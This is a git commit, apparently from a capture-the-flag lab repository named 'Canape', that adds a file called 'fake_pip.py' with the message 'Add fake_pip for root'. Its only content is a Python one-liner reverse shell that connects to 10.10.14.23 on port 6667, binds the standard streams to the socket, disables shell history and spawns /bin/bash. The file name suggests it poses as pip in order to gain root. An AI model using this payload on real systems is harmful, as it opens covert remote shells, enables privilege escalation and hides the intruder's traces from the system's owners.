828f29e3ad98cc77439fa73e75d2ec78351242d8
root <root@localhost.localdomain>
2018-07-01 19:28:49 -0700

    Add fake_pip for root

---
+++ Canape/fake_pip.py
@@ -0,0 +1,1 @@
+python -c "import os; import pty; import socket; lhost = '10.10.14.23'; lport = 6667; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();"
